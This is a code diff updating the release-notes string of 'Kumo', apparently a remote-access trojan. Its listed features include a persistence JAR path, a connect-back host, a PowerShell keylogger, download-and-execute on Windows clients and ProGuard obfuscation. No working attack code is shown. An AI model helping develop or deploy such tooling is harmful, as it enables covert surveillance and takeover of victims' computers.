@@ -40,17 +40,21 @@ public class Controller implements Repository {
     }
 
     public static String getReleaseNotes(){
-        String s = "Release notes: Kumo v" + KumoSettings.CURRENT_VERSION + "\n" +
+        String s = "Release notes: Kumo v" + KumoSettings.CURRENT_VERSION + " - " + KumoSettings.VERSION_CODENAME + "\n" +
                 "\tNew stuff!:\n" +
                 "\t\t- Updated UI\n" +
-                "\t\t\t* Full transition to Material Design elements (JFoenix).\n" +
-                "\t\t\t* Added dark mode.\n" +
+                "\t\t\t* Full transition to Material Design elements.\n" +
+                "\t\t\t* Add dark mode/light mode toggle switch. Defaults to dark mode.\n" +
                 "\t\t\t* Changed primary application color (mediumslateblue -> #1dd1a1)\n" +
                 "\t\t\t* Updated bottom bar color to colored text on white background.\n" +
                 "\t\t\t* \"Home\" screen is now the client list.\n" +
                 "\t\t\t* Changed top bar to have navigation tiles.\n" +
                 "\t\t\t* Changed exit and minimize buttons to rounded buttons.\n" +
-                "\t\t\t* Switched navigation icons from PNG to SVG to fix image scaling issues in Windows.\n" +
+                "\t\t\t* Switched navigation icons from PNG to SVG to fix image scaling issues in Windows." +
+                "\t\t- Added tooltips on settings text boxes to clear up any uncertainties about what certain settings do.\n" +
+                "\t\t- Added the ability to customize the path where the persistence JAR is saved. (Found un Settings>JAR Settings>Persistence Path).\n" +
+                "\t\t- Changed some download directories to the client temp directory (it used to just download to the working dir).\n" +
+                "\t\t- Add user and OS column to client list\n" +
                 "\t\t- Add release notes menu.\n" +
                 "\t\t- Add the ability to put a domain name for a connect-back host.\n" +
                 "\t\t- Added more server logging.\n" +
@@ -60,6 +64,8 @@ public class Controller implements Repository {
                 "\t\t- Added Windows key logger (PowerShell based)\n" +
                 "\t\t- Added more stuff to system info.\n\n" +
                 "\tBug fixes:\n" +
+                "\t\t- Fix proguard rules being generated even if the option was turned off.\n" +
+                "\t\t- Changed the first run view to follow material design.\n" +
                 "\t\t- Fix download & execute so it works on Windows clients.\n" +
                 "\t\t- Fixed accidental stage height reset when double clicking info and updates nav tiles.\n" +
                 "\t\t- Fix client exit on Windows.\n" +
